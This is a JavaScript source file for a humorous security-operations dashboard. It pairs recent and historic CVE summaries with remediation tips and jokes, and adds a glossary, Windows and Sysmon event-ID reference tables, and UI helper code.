
/* ======================================================================
   DATA — in production this whole object comes from fetch('data.json'),
   regenerated hourly by the VM pipeline (KEV + EPSS + NVD + AI captions).
   Fields marked null = not in this snapshot; the pipeline fills them.
   ====================================================================== */
const FP_DATA = {
  generated: "2026-11-21T08:00:00Z",
  kevAddedLast7d: 6,
  lastEdgeCritical: "2026-11-19",
  edgeRecordDays: 11,
  trending: [
    {id:"CVE-2026-31431", nick:"Copy Fail", st:"POC PUBLIC", kev:null, sev:"high", product:"Linux kernel", type:"Local privilege escalation",
     why:"Reported as the most researched CVE of 2026 so far: lots of public exploit code means attackers already on a box can get root.",
     roast:"Every GitHub account now has a PoC folder and a dream.",
     action:"Patch the kernel and actually reboot. Prioritise multi-user and container hosts.",
     hug:"Kernel patch weekends build character. Allegedly."},
    {id:"CVE-2026-39987", nick:"marimo pre-auth RCE", st:"EXPLOITED", kev:null, sev:"critical", product:"marimo notebooks", type:"Pre-auth RCE via terminal WebSocket",
     why:"Broad exploitation and botnet weaponization were reported. Exposed notebooks = remote shell for anyone.",
     roast:"Data scientists exposed a notebook to the internet. Botnets did some data science of their own.",
     action:"Upgrade marimo, and never expose notebook servers publicly. Check for odd child processes.",
     hug:"Shadow IT isn't your fault. Finding it is your superpower."},
    {id:"CVE-2026-76461", nick:"Root-by-email", st:"EXPLOITED", kev:null, sev:"critical", product:"Cisco Secure Email Gateway", type:"SQL injection → root command execution",
     why:"Reported as actively exploited: a crafted email can lead to root command execution on the gateway itself.",
     roast:"The email gateway's job is to stop malicious email. It took that personally.",
     action:"Apply the vendor fix, review the gateway for compromise, and watch its outbound traffic.",
     hug:"Defending the thing that defends you is peak blue team."},
    {id:"CVE-2025-53770", nick:"ToolShell", st:"KEV LISTED", kev:true, sev:"critical", product:"SharePoint Server (on-prem)", type:"Unauthenticated RCE (deserialization)",
     why:"Mass-exploited in 2025. Attackers stole machine keys, so patching alone did not evict them.",
     roast:"Where documents go to collaborate, and attackers go to collaborate too.",
     action:"Patch, rotate ASP.NET machine keys, restart IIS, then hunt for web shells.",
     hug:"Rotating machine keys counts as a workout."},
    {id:"CVE-2024-3400", nick:"GlobalProtect injection", st:"KEV LISTED", kev:true, sev:"critical", product:"Palo Alto PAN-OS", type:"Unauthenticated command injection",
     why:"A firewall bug giving root on the edge device: the classic 'way in' pattern of the last few years.",
     roast:"The firewall was the front door. Specifically, it was the doorbell.",
     action:"Upgrade to a fixed hotfix and check the device for compromise artifacts.",
     hug:"Edge devices are hard. You're doing great."}
  ],
  hof: [
    {era:"classic", year:2014, id:"CVE-2014-0160", nick:"Heartbleed", feel:"existential", product:"OpenSSL", sev:"high",
     lesson:"Memory over-reads can leak secrets like private keys. Patching wasn't enough: certificates had to be reissued.",
     roast:"The first bug with its own logo and website. Proved a vulnerability needs branding to get patched.", hug:"You re-issued every certificate on the internet. Legend."},
    {era:"classic", year:2014, id:"CVE-2014-6271", nick:"Shellshock", feel:"betrayed by bash", product:"GNU Bash", sev:"critical",
     lesson:"Environment variables passed to bash (e.g. via CGI) could carry commands. Old code paths hide old bugs.",
     roast:"Bash had quietly been doing this since 1989. It just didn't think anyone would ask.", hug:"Grepping every CGI script you own is valid cardio."},
    {era:"classic", year:2017, id:"CVE-2017-0144", nick:"EternalBlue", feel:"WannaCried", product:"SMBv1", sev:"high",
     lesson:"A wormable SMB flaw powered WannaCry and NotPetya. Lesson: kill legacy protocols, block SMB at the edge.",
     roast:"SMBv1: retired in theory, still employed in practice.", hug:"Every disabled SMBv1 server is a small act of love."},
    {era:"modern", year:2020, id:"CVE-2020-1472", nick:"Zerologon", feel:"domain admin, apparently", product:"Netlogon", sev:"critical",
     lesson:"A crypto flaw let an attacker on the network take over a domain controller. Patch DCs first, always.",
     roast:"The password was all zeros. The access was all access.", hug:"Your DCs are patched now. Go drink some water."},
    {era:"modern", year:2021, id:"CVE-2021-26855", nick:"ProxyLogon", feel:"aged 5 years", product:"Exchange Server", sev:"critical",
     lesson:"Internet-facing on-prem Exchange was mass-exploited and web shells were everywhere. Patch + hunt, not patch alone.",
     roast:"Exchange admins aged five years in one week. The web shells were thriving, though.", hug:"If you survived March 2021, you can survive this shift."},
    {era:"modern", year:2021, id:"CVE-2021-34527", nick:"PrintNightmare", feel:"haunted", product:"Windows Print Spooler", sev:"high",
     lesson:"The spooler allowed remote code execution as SYSTEM. Disable services you don't need, especially on DCs.",
     roast:"The print spooler: the gift that keeps on spooling.", hug:"Disabling the spooler on DCs is self-care."},
    {era:"modern", year:2021, id:"CVE-2021-44228", nick:"Log4Shell", feel:"Christmas cancelled", product:"Apache Log4j", sev:"critical",
     lesson:"Logging an attacker-controlled string triggered remote code loading. You can't patch what you don't know you have: SBOMs matter.",
     roast:"A logging library logged everyone out of their December.", hug:"You found Log4j in places it shouldn't exist. That's real skill."},
    {era:"modern", year:2022, id:"CVE-2022-30190", nick:"Follina", feel:"troubleshot", product:"Windows MSDT", sev:"high",
     lesson:"A document could launch the MSDT troubleshooter to run code, even without macros. Watch Office spawning odd children.",
     roast:"A Word doc launched the troubleshooter. The troubleshooter was the trouble.", hug:"Not every Office alert is your fault. Most, but not every."},
    {era:"modern", year:2023, id:"CVE-2023-34362", nick:"MOVEit", feel:"transferred", product:"MOVEit Transfer", sev:"critical",
     lesson:"One SQL injection in a file-transfer app led to mass data theft across thousands of organisations. Third-party risk is your risk.",
     roast:"Managed file transfer did exactly what it promised: it transferred the files. To someone else.", hug:"Vendor breaches aren't your fault. The paperwork, sadly, is your job."},
    {era:"modern", year:2023, id:"CVE-2023-4966", nick:"Citrix Bleed", feel:"session-less", product:"NetScaler ADC/Gateway", sev:"critical",
     lesson:"Leaked session tokens let attackers skip MFA. After patching, you must kill active sessions too.",
     roast:"Session tokens, now available to everyone. Very inclusive.", hug:"Killing every session was the right call. Ignore the angry emails."},
    {era:"recent", year:2024, id:"CVE-2024-3094", nick:"XZ Utils backdoor", feel:"trust issues", product:"xz / liblzma", sev:"critical",
     lesson:"A multi-year social-engineering takeover of an open-source project. Caught because SSH logins were ~500ms slower.",
     roast:"Foiled because one engineer thought SSH felt slow. Never ignore 'feels slow'.", hug:"Never apologise for investigating something that 'just feels off'."},
    {era:"recent", year:2024, id:"CVE-2024-6387", nick:"regreSSHion", feel:"déjà vu", product:"OpenSSH", sev:"high",
     lesson:"A regression of a 2006 bug (CVE-2006-5051). Regression tests are security controls.",
     roast:"A bug from 2006 came back for an encore. Nobody requested an encore.", hug:"Patching sshd fleet-wide? You're basically on a world tour."}
  ],
  history: [
    {md:"11-02", year:1988, t:"Morris worm", d:"One of the first internet worms. A grad student's experiment slowed a large part of the early internet."},
    {md:"05-04", year:2000, t:"ILOVEYOU", d:"A love-letter VBS email worm spread worldwide. People really wanted to be loved."},
    {md:"04-07", year:2014, t:"Heartbleed disclosed", d:"OpenSSL memory leak goes public. The era of bugs with logos begins."},
    {md:"09-24", year:2014, t:"Shellshock disclosed", d:"Bash environment-variable command injection. CGI servers everywhere sweat."},
    {md:"05-12", year:2017, t:"WannaCry outbreak", d:"Ransomware worm using EternalBlue hits hospitals and companies worldwide. A kill-switch domain slowed it."},
    {md:"06-27", year:2017, t:"NotPetya", d:"Destructive 'ransomware' spreads via a poisoned software update. Billions in damage."},
    {md:"09-07", year:2017, t:"Equifax breach announced", d:"An unpatched Apache Struts flaw led to one of the largest data breaches of personal data."},
    {md:"12-13", year:2020, t:"SolarWinds / SUNBURST", d:"Supply-chain compromise of Orion updates becomes public. 'Trust the update' gets complicated."},
    {md:"05-07", year:2021, t:"Colonial Pipeline", d:"Ransomware forces a major US fuel pipeline to shut down operations."},
    {md:"07-02", year:2021, t:"Kaseya VSA", d:"Ransomware pushed through an MSP tool reaches many downstream businesses at once."},
    {md:"12-09", year:2021, t:"Log4Shell goes public", d:"The holiday season that wasn't. JNDI enters every analyst's vocabulary."},
    {md:"05-31", year:2023, t:"MOVEit disclosed", d:"Mass exploitation of MOVEit Transfer by a ransomware/extortion group."},
    {md:"03-29", year:2024, t:"XZ backdoor found", d:"A backdoor in xz/liblzma is caught days before reaching stable distros."},
    {md:"07-01", year:2024, t:"regreSSHion", d:"OpenSSH signal-handler race condition (a returning 2006 bug) disclosed."},
    {md:"07-19", year:2024, t:"Global endpoint outage", d:"A faulty security-agent content update crashes millions of Windows machines. Change control becomes a security topic."}
  ],
  ticker: [
    ["KEV","{kev} new entries added to CISA KEV this week. Weather: as advertised."],
    ["2026","Linux 'Copy Fail' (CVE-2026-31431) is the most researched CVE of the year. Your kernel has entered the chat."],
    ["BOTNET","marimo pre-auth RCE (CVE-2026-39987): botnets moved in before the data scientists moved out."],
    ["EMAIL","Cisco Secure Email Gateway CVE-2026-76461 reported exploited: the gateway got phished, in a way."],
    ["MOOD","Edge devices remain the favourite way in. The edge is not a vibe, it's a liability."],
    ["PSA","It's DNS. It's always DNS. Except when it's the printer."],
    ["TIP","Hydrate. The SIEM will still be screaming in five minutes."]
  ],
  brew: [
    {t:"Email gateways are targets, not just shields", take:"An actively exploited email-gateway bug means the box that filters attacks can become the attacker's foothold. Check your gateway's version and its outbound connections today.", lol:"Who filters the filter? (You. It's you.)"},
    {t:"Notebook servers are the new forgotten Jenkins", take:"Exposed data-science tools like marimo are being hit by botnets. Ask your data team what's running on public IPs.", lol:"'It's just a notebook' — famous last words, 2026 edition."},
    {t:"Patch + hunt, not patch alone", take:"For anything where keys or sessions could be stolen (SharePoint, Citrix-style bugs), patching doesn't evict an attacker. Rotate secrets and hunt.", lol:"Patching a breached box is like changing the lock while the burglar is still in the kitchen."}
  ],
  manager: {
    theme:"Edge and gateway devices",
    bullets:[
      "Theme of the week: attackers keep targeting internet-facing appliances (email gateways, VPNs, firewalls).",
      "Ask the team: do we know every internet-facing appliance we own, and its current version?",
      "Ask the team: for exploited bugs, do we rotate keys/sessions after patching, not just patch?",
      "Metric to watch: time from a KEV listing to patched on our edge devices."],
    board:"Attackers are focusing on the devices that sit on our perimeter. We are tracking them and prioritising those patches."
  }
};

const TERMS = [
  ["KEV","CISA's Known Exploited Vulnerabilities catalog: CVEs confirmed to be exploited in the wild. If it's in KEV and you have it, it jumps the queue."],
  ["EPSS","Exploit Prediction Scoring System: the probability (0–1) that a CVE will be exploited in the next 30 days. CVSS says how bad; EPSS says how likely."],
  ["Living off the land (LOLBins)","Attackers using built-in tools like PowerShell, certutil or rundll32 instead of malware, so they blend in with admins."],
  ["Beaconing","Malware checking in with its command-and-control server on a regular rhythm. Suspiciously perfect intervals are a tell."],
  ["Dwell time","How long an attacker is inside before being detected. Your job, in one metric: make it shorter."],
  ["Pass-the-hash","Logging in with a stolen password hash instead of the password itself. Why protecting LSASS matters."],
  ["Kerberoasting","Requesting service tickets for accounts with SPNs, then cracking them offline. Long, random service-account passwords ruin it."],
  ["SBOM","Software Bill of Materials: a list of components inside your software. Log4Shell is why everyone suddenly wanted one."],
  ["Sigma","A vendor-neutral format for detection rules that converts into KQL, SPL and others. Write once, hunt anywhere."],
  ["Initial access broker","Criminals who break in and sell the access to ransomware groups. The breach and the ransomware are often different people."]
];

const EVENTS = [
  ["4624","An account successfully logged on","Check the logon type (see Logon types tab)"],
  ["4625","An account failed to log on","Spikes = brute force or a broken service account"],
  ["4634","An account was logged off",""],
  ["4648","Logon using explicit credentials","e.g. runas; can show lateral movement"],
  ["4672","Special privileges assigned to new logon","Admin-equivalent logons"],
  ["4688","A new process has been created","Enable command-line auditing to make it useful"],
  ["4697","A service was installed (Security log)","Persistence / lateral movement"],
  ["4698","A scheduled task was created","Persistence"],
  ["4720","A user account was created","Unexpected new accounts = red flag"],
  ["4728","Member added to a security-enabled global group","Watch Domain Admins"],
  ["4732","Member added to a security-enabled local group","Watch local Administrators"],
  ["4740","A user account was locked out","Brute force or a stale password"],
  ["4768","Kerberos TGT requested","Authentication on DCs"],
  ["4769","Kerberos service ticket requested","Many RC4 requests can mean Kerberoasting"],
  ["4771","Kerberos pre-authentication failed","Password spraying against Kerberos"],
  ["4776","DC attempted to validate credentials (NTLM)","NTLM usage and failures"],
  ["1102","The audit log was cleared","Almost never legitimate in production"],
  ["7045","A service was installed (System log)","Persistence; check the image path"],
  ["4104","PowerShell script block logged","Shows decoded script content"]
];
const SYSMON = [
  ["1","Process creation","Full command line + parent process + hashes"],
  ["3","Network connection","Which process talked to which IP/port"],
  ["7","Image loaded","DLL loads; noisy, filter it"],
  ["8","CreateRemoteThread","Common in process injection"],
  ["10","ProcessAccess","e.g. something opening LSASS"],
  ["11","FileCreate","Dropped files"],
  ["12/13","Registry create/delete, value set","Run keys and other persistence"],
  ["22","DNS query","Which process resolved which domain"]
];
const LOGONS = [
  ["2","Interactive","Keyboard at the machine"],
  ["3","Network","SMB, file shares; most common in lateral movement"],
  ["4","Batch","Scheduled tasks"],
  ["5","Service","Services starting under an account"],
  ["7","Unlock","Unlocking a workstation"],
  ["8","NetworkCleartext","Credentials sent in cleartext (e.g. basic auth)"],
  ["9","NewCredentials","runas /netonly"],
  ["10","RemoteInteractive","RDP"],
  ["11","CachedInteractive","Logon with cached domain credentials (offline)"]
];
const ATTACK = [
  ["T1566","Phishing"],["T1190","Exploit Public-Facing Application"],["T1078","Valid Accounts"],
  ["T1059.001","PowerShell"],["T1053.005","Scheduled Task"],["T1003.001","LSASS Memory (credential dumping)"],
  ["T1021.001","Remote Desktop Protocol"],["T1486","Data Encrypted for Impact (ransomware)"],
  ["T1547.001","Registry Run Keys / Startup Folder"],["T1071.001","Application Layer Protocol: Web"],
  ["T1110","Brute Force"],["T1136","Create Account"],["T1105","Ingress Tool Transfer"],
  ["T1218.011","Rundll32"],["T1070.001","Clear Windows Event Logs"],["T1543.003","Windows Service"]
];
const WORDS = [
  ["PATCH","The fix. Also the name of our cat."],["PROXY","Sits between client and server. Great for logging; attackers love abusing them too."],
  ["SHELL","What attackers want. Web shells, reverse shells: if you see one, it's a bad day."],["TOKEN","Session tokens can be stolen to skip passwords and MFA (see Citrix Bleed)."],
  ["SPOOF","Faking an identity: email sender, IP, caller ID. SPF/DKIM/DMARC fight email spoofing."],["NONCE","A number used once. Prevents replay attacks in crypto protocols."],
  ["CHAIN","Attackers chain small bugs into a big one. Also: supply chain."],["ROGUE","Rogue access points, rogue admins, rogue devices: anything unauthorised on your network."],
  ["ALERT","What you dream about at night. Not in a good way."],["PHISH","Still the #1 way in for most organisations. Report, don't click."],
  ["AUDIT","Audit logs are how you reconstruct what happened. Clearing them (event 1102) is a red flag."],["CYBER","The prefix that makes everything sound 30% more expensive."],
  ["ADMIN","The account everyone wants. Use separate admin accounts and never browse the web with them."],["LOGIN","Failed logins (4625) in bursts = brute force or spraying."],
  ["EXFIL","Exfiltration: data leaving. Watch for big uploads to cloud storage at 3 AM."],["QUEUE","The alert queue. It is never empty. It never will be. Accept it."],
  ["SIGMA","Vendor-neutral detection rule format. Write once, convert to KQL/SPL."],["SNORT","Classic open-source IDS. Its rules inspired many network signatures."],
  ["MITRE","The org behind ATT&CK and the CVE program."],["LSASS","Windows process holding credentials in memory. Protect it; alert on access."],
  ["PIVOT","Moving from one compromised host to another. Also what analysts do between data sources."],["BRUTE","Brute force: guessing passwords fast. MFA and lockout policies slow it down."],
  ["AGENT","EDR agents, AI agents… all need protecting now."],["FLOOD","SYN floods and DDoS. Volume as a weapon."],
  ["VAULT","Where secrets should live instead of in scripts."],["TRUST","Zero trust: verify every request, assume breach."],
  ["RELAY","NTLM relay: forwarding authentication to another server. SMB signing helps."],["SPAWN","Process spawning: Word spawning PowerShell is a classic red flag."],
  ["DECOY","Honeypots and canary tokens: decoys that alert when touched."],["CRACK","Offline password cracking of stolen hashes. Long passphrases win."]
];

/* ---------------- helpers ---------------- */
const $ = s => document.querySelector(s);
const $$ = s => Array.from(document.querySelectorAll(s));
const store = {
  get(k,d){ try{ const v=localStorage.getItem("fpc_"+k); return v===null?d:JSON.parse(v);}catch(e){return d;} },
  set(k,v){ try{ localStorage.setItem("fpc_"+k,JSON.stringify(v)); }catch(e){} }
};
const esc = s => String(s).replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
function toast(msg){ const t=$("#toast"); t.textContent=msg; t.classList.add("show"); clearTimeout(t._h); t._h=setTimeout(()=>t.classList.remove("show"),4200); }
function dayNum(d=new Date()){ return Math.floor((Date.UTC(d.getFullYear(),d.getMonth(),d.getDate()) - Date.UTC(2026,0,1))/864e5); }
function todayKey(){ const d=new Date(); return `${d.getFullYear()}-${d.getMonth()+1}-${d.getDate()}`; }
function pick(arr,seed){ return arr[((seed%arr.length)+arr.length)%arr.length]; }
async function copyText(t){ try{ await navigator.clipboard.writeText(t); toast("Copied "); }catch(e){ toast("Copy blocked here. Select and copy manually."); } }

/* ---------------- stats ---------------- */
const stats = Object.assign({pop:0,smash:0,breath:0,phish:0,ffok:0,card:0,arcade:0,brew:0,night:0}, store.get("stats",{}));
function renderStats(){ Object.keys(stats).forEach(k=>{ const el=$("#s-"+k); if(el) el.textContent=stats[k]; }); }
function bump(k){ stats[k]++; store.set("stats",stats); renderStats();
  if(["pop","smash","breath","ffok"].includes(k)) store.set("brk_"+todayKey(), store.get("brk_"+todayKey(),0)+1);
  if(k==="arcade") store.set("arc_"+todayKey(), true);
  if(typeof renderGame==="function") renderGame(); }
renderStats();

/* ---------------- router ---------------- */
const VIEWS = ["lounge","desk","brew","menu","detect","arcade","pwlab","tycoon","shop","fame","learn","socdle","breakroom","shift","me"];
function route(){
  let v = (location.hash||"#lounge").slice(1); if(!VIEWS.includes(v)) v="lounge";
  $$(".view").forEach(x=>x.classList.toggle("on", x.id==="v-"+v));
  $$("#nav a").forEach(a=>a.classList.toggle("on", a.dataset.v===v));
  if(v==="brew" && store.get("brewSeen","")!==todayKey()){ store.set("brewSeen", todayKey()); bump("brew"); }
  if(v!=="arcade" && typeof stopGame==="function") stopGame();
  if(v==="tycoon" && typeof renderTycoon==="function") renderTycoon();
  if(v==="shop" && typeof renderShop==="function") renderShop();
  if(v==="me" && typeof renderMe==="function") renderMe();
  $("#brewNew").style.display = store.get("brewSeen","")===todayKey() ? "none" : "";
  window.scrollTo(0,0);
}
window.addEventListener("hashchange", route);

/* ---------------- top bar ---------------- */
const W_ = (()=>{ const n=FP_DATA.kevAddedLast7d;
  return n>=10?["","Patch storm"]:n>=5?["","Scattered exploits"]:n>=1?["","Cloudy, chance of PoC"]:["","Suspiciously calm"]; })();
$("#weather").innerHTML = `${W_[0]} <b>${W_[1]}</b>`; $("#weather").title = `${FP_DATA.kevAddedLast7d} KEV additions in the last 7 days`;

function nextPatchTuesday(now){
  for(let add=0; add<3; add++){
    const y=now.getUTCFullYear(), m=now.getUTCMonth()+add;
    const first=new Date(Date.UTC(y,m,1)); const off=(2-first.getUTCDay()+7)%7;
    const pt=new Date(Date.UTC(y,m,1+off+7,18,0,0)); if(pt>now) return pt;
  }
}
function fmtDur(ms){ const s=Math.max(0,Math.floor(ms/1000)); return [Math.floor(s/3600),Math.floor(s/60)%60,s%60].map(x=>String(x).padStart(2,"0")).join(":"); }
function tick(){
  const now=new Date(), ms=nextPatchTuesday(now)-now, d=Math.floor(ms/864e5), h=Math.floor(ms/36e5)%24;
  $("#pt").textContent = d>0?`in ${d}d ${h}h`:`in ${h}h, brace`;
  const hh=now.getHours(), night=hh>=22||hh<6;
  document.body.classList.toggle("night",night);
  $("#clock").innerHTML = `${night?"":""} <b>${String(hh).padStart(2,"0")}:${String(now.getMinutes()).padStart(2,"0")}</b> ${night?"night shift":"day shift"}`;
  const days=Math.max(0,Math.floor((Date.now()-new Date(FP_DATA.lastEdgeCritical+"T00:00:00Z"))/864e5));
  $("#days").textContent=days;
  $("#signsub").textContent = days===0?"Today. It happened today. We're fine. Everything is fine.":`Our record is ${FP_DATA.edgeRecordDays}. Please do not lean on the VPN concentrator.`;
  // shift + title
  const st=store.get("shiftStart",null), len=store.get("shiftLen",12);
  if(st){ const el=Date.now()-st, pct=Math.min(100,el/(len*36e5)*100);
    $("#shiftClock").textContent=fmtDur(el); $("#shiftBar").style.width=pct+"%";
    $("#shiftInfo").textContent = pct>=100?"Shift complete. Go home. Log off. Touch grass. ":`${Math.round(pct)}% of a ${len}h shift · ${fmtDur(len*36e5-el)} to go`;
    document.title = `${fmtDur(el).slice(0,5)} · ${W_[0]} FP Café`;
  } else { document.title = `FP Café · ${W_[0]} ${FP_DATA.kevAddedLast7d} KEV this week`; }
}
setInterval(tick,1000);

$("#amb").onclick = ()=>{ location.hash="#lounge"; document.body.classList.toggle("ambient"); $("#amb").classList.toggle("on");
  if(document.body.classList.contains("ambient")) toast("Ambient mode: just the aquarium. Press the button again to exit."); };

/* ---------------- Patch ---------------- */
const SAY_DAY=["You are not your alert count. ","Closing a false positive is still closing something. Progress!",
 "Nobody notices the breaches you stopped. I noticed. Good job.","Hydrate. The queue is a marathon. Also a treadmill.",
 "If the alert says 'critical' and the asset is the printer… breathe first.","Escalating is not failing. It's teamwork with extra steps.",
 "You read the logs so the CEO doesn't have to. Hero behaviour.","'It worked in the lab' is a valid emotional state.",
 "Stretch your neck. Your SIEM can't see you. Probably.","Today's SOCdle is waiting. Low stakes. High bragging rights."];
const SAY_NIGHT=["3 AM thoughts are not incident findings. Write them down, review at 9. ","Night crew: the internet never sleeps, so you're its babysitter.",
 "Snack check. A fed analyst is a calm analyst.","If it's quiet… don't say it's quiet. ","The attackers are in a different time zone. They're tired too."];
let sayI=dayNum();
const SAY_GENTLE=["You're doing better than you think. ","One alert at a time. That's the whole job.","Take a slow breath. You've got this.","It's okay not to know everything. Nobody does. Ask, learn, move on.","Proud of you for showing up today."];
const SAY_ROLE={"SOC manager":["Your team is doing more than the dashboards show. Tell them.","Metrics show trends, not people's worth. ","A 10-minute 1:1 can prevent a 10-week burnout."],
  "Detection eng":["Every noisy rule you tune gives an analyst an hour back.","Test your rule against last week's data before Friday. Trust me."],
  "Threat hunter":["No findings is a finding. Write it up.","Baseline first. Then go weird."],
  "IR / L2":["Timeline first, theories second.","Document as you go. Future you is tired."],
  "L1 analyst":["Asking 'is this normal?' is a skill, not a weakness.","Escalate when unsure. That's literally the process."]};
function patchSays(){ const p=P(), night=document.body.classList.contains("night");
  let pool=p.humor==="gentle"?SAY_GENTLE.concat(SAY_ROLE[p.role]||[]):(night?SAY_NIGHT:SAY_DAY.concat(SAY_ROLE[p.role]||[]));
  const m=todayMood(); if(m!==null&&m>=3) pool=SAY_GENTLE.concat(["Rough day? Take a real break. The queue can wait 5 minutes."]);
  let line=pool[(sayI++)%pool.length]; if(p.name&&sayI%4===0) line=`${p.name}, `+line.charAt(0).toLowerCase()+line.slice(1);
  $("#say").textContent=line; const b=BUD(); $("#cat").textContent=b.key==="cat"?(night?"":pick(["","","",""],sayI)):b.e; }
setInterval(patchSays,45000);

/* ---------------- horoscope ---------------- */
const HORO={
 "L1 analyst":["Mercury is in retrograde and so is your queue. An alert you closed yesterday will return with a new hostname.","The stars favour you: a phishing report will actually be phishing. Savour it.","Expect a mysterious PowerShell alert. It is the IT admin. It is always the IT admin.","A user will say 'I didn't click anything'. The logs will lovingly disagree."],
 "IR / L2":["Today, the first event in your timeline will be the actual first event.","A lead goes cold, but a scheduled task speaks. Listen to the scheduled task.","Someone will ask 'are we breached?' on a call. You'll say 'investigating'. Your aura: majestic.","Beware evidence sent as a screenshot. Ask for the logs. Nicely. Twice."],
 "Detection eng":["Your new rule will fire 4,000 times. Three of them will be beautiful.","A Sigma rule you wrote in 2023 saves the day. Past you says 'you're welcome'.","You will tune a noisy rule today and the SOC will silently love you forever.","The universe whispers: add a filter for the backup server. You know which one."],
 "Threat hunter":["The hypothesis you dismissed at standup is the one. Go back for it.","You'll find something weird in DNS. It will be fine. It will also be weird.","A rare parent-child process pair awaits. Bring snacks.","Stars say: baseline first, panic later."],
 "SOC manager":["A vendor will promise to 'eliminate alert fatigue'. Your team will laugh in a meeting you're not in.","Budget season approaches. Your red heatmap has never looked so useful.","Today, thank an analyst by name. The ROI is unreal.","Someone will ask for a 'quick' metric. It will not be quick."]
};
let role=store.get("role","L1 analyst"); if(!HORO[role]) role="L1 analyst";
function renderHoro(){
  $("#roles").innerHTML=Object.keys(HORO).map(r=>`<button class="${r===role?'on':''}" data-r="${esc(r)}">${esc(r)}</button>`).join("");
  const s=dayNum()+role.length*7;
  $("#horo").textContent=pick(HORO[role],s);
  $("#lucky").textContent=`Lucky port: ${pick([22,53,80,123,443,445,3389,8443],s*3)} · Lucky event ID: ${pick([4624,4688,4698,7045,4104,1102],s*5)} · Avoid: ${pick(["regex on Fridays","'quick' changes","reply-all","prod","unfiltered queries"],s)}`;
}
$("#roles").onclick=e=>{ const r=e.target.dataset.r; if(!r) return; role=r; store.set("role",r); renderHoro(); };

/* ---------------- ticker ---------------- */
(function(){ const it=FP_DATA.ticker.map(([t,x])=>`<span><span class="tag">[${esc(t)}]</span>${esc(x.replace("{kev}",FP_DATA.kevAddedLast7d))}</span>`).join(""); $("#ticker").innerHTML=it+it; })();

/* ---------------- brew ---------------- */
function renderBrew(){
  const d=new Date();
  $("#brewDate").textContent = "Morning Brew · " + d.toLocaleDateString(undefined,{weekday:"long",day:"numeric",month:"long"});
  const items=FP_DATA.brew.map((b,i)=>Object.assign({},b,{mine:mineTags(BREW_TAGS[i]||[])})).sort((a,b)=>b.mine-a.mine);
  $("#brewItems").innerHTML = items.map((b,i)=>`<div class="item"><div class="n">${i+1}</div><div>
    <div class="ttl">${esc(b.t)} ${b.mine?'<span class="pill p-you">your stack</span>':''}</div><div class="take">${esc(b.take)}</div><div class="lol">${esc(b.lol)}</div></div></div>`).join("");
  const m=FP_DATA.manager;
  $("#mgr").innerHTML = `<div class="small">Theme: <span class="pill p-lav">${esc(m.theme)}</span></div>
    <ul class="tight">${m.bullets.map(b=>`<li>${esc(b)}</li>`).join("")}</ul>
    <div class="u1">
      <b>Board-safe one-liner:</b> ${esc(m.board)}</div>`;
  const tm=pick(TERMS,dayNum());
  $("#term").innerHTML=`<div class="u2">${esc(tm[0])}</div><div class="u3">${esc(tm[1])}</div>`;
  const near=nearestHistory();
  $("#otd").innerHTML=`<div class="small">${near.diff===0?"Exactly today!":near.diff>0?`${near.diff} days from now`:`${-near.diff} days ago`}, ${near.e.year}</div>
    <div class="u4">${esc(near.e.t)}</div><div class="u5">${esc(near.e.d)}</div>
    <a class="u6 btn sm" href="#fame">full timeline →</a>`;
  const top=FP_DATA.trending.filter(t=>t.sev==="critical").slice(0,2);
  $("#miniBrew").innerHTML = `${W_[0]} <b>${W_[1]}</b>: ${FP_DATA.kevAddedLast7d} KEV additions this week.<br>
    Hot: ${top.map(t=>`<b>${esc(t.nick)}</b>`).join(" and ")}.<br>
    Term: <b>${esc(tm[0])}</b> · SOCdle ${store.get("dle_"+todayKey(),null)?.done?"done ":"waiting"}
    ${FP_DATA.trending.some(c=>isMine(c))?`<br><b>${FP_DATA.trending.filter(c=>isMine(c)).length}</b> trending CVE(s) match your stack.`:""}`;
}
function nearestHistory(){
  const now=new Date(), y=now.getFullYear(); let best=null;
  FP_DATA.history.forEach(e=>{ const [m,d]=e.md.split("-").map(Number);
    let diff=Math.round((new Date(y,m-1,d)-new Date(y,now.getMonth(),now.getDate()))/864e5);
    if(diff>182) diff-=365; if(diff<-182) diff+=365;
    if(!best||Math.abs(diff)<Math.abs(best.diff)) best={e,diff}; });
  return best;
}
/* ---------------- menu ---------------- */
const SPICE={critical:"",high:"",medium:""};
let mfilter="all";
function sevPill(s){ return s==="critical"?'<span class="pill p-crit">CRITICAL</span>':s==="high"?'<span class="pill p-high">HIGH</span>':'<span class="pill p-unk">?</span>'; }
function kevPill(k){ return k===true?'<span class="pill p-kev">IN KEV</span>':k===null?'<span class="pill p-unk" title="Not in this snapshot; the live pipeline checks KEV hourly">KEV: check</span>':''; }
function menuCard(c,old){
  return `<div class="mcard">
    <div class="row"><span class="nick">${esc(c.nick)}</span><span><span class="spice" title="${esc(c.sev)}">${SPICE[c.sev]||""}</span><button class="star" data-star="${esc(c.id)}" title="watchlist">${watch.includes(c.id)?"":""}</button></span></div>
    <div class="cve">${esc(c.id)} · ${esc(c.product)}${old?` · ${c.year}`:""}</div>
    <div>${sevPill(c.sev)} ${old?"":kevPill(c.kev)} ${isMine(c)?'<span class="pill p-you">your stack</span>':''}</div>
    ${c.type?`<div class="lbl">what it is</div><div class="u7">${esc(c.type)}</div>`:""}
    <div class="lbl">${old?"the lesson":"why it matters"}</div><div class="u5">${esc(old?c.lesson:c.why)}</div>
    ${c.action?`<div class="lbl">do this</div><div class="u8">${esc(c.action)}</div>`:""}
    <div class="lbl">the roast</div><div class="roast">${esc(c.roast)}</div>
    <div class="hug">${esc(c.hug)} · <a href="https://nvd.nist.gov/vuln/detail/${encodeURIComponent(c.id)}" target="_blank" rel="noopener noreferrer">NVD ↗</a></div>
  </div>`;
}
function renderMenu(){
  $("#mf").innerHTML=[["all","Everything"],["mine","My stack"],["watch","Watchlist"],["critical","Critical only"],["kev","In KEV"]].map(([k,l])=>`<button class="${k===mfilter?'on':''}" data-f="${k}">${l}</button>`).join("");
  const q=$("#mq").value.trim().toLowerCase();
  const ok=c=>(mfilter==="all"||(mfilter==="critical"&&c.sev==="critical")||(mfilter==="kev"&&c.kev===true)||(mfilter==="mine"&&isMine(c))||(mfilter==="watch"&&watch.includes(c.id)))
    &&(!q||[c.id,c.nick,c.product,c.type||""].join(" ").toLowerCase().includes(q));
  const now=FP_DATA.trending.filter(ok), old=FP_DATA.hof.filter(c=>ok(Object.assign({},c,{kev:mfilter==="kev"?false:c.kev})));
  $("#menuNow").innerHTML=now.map(c=>menuCard(c,false)).join("")||'<div class="small">Nothing on the menu matches. Enjoy the calm.</div>';
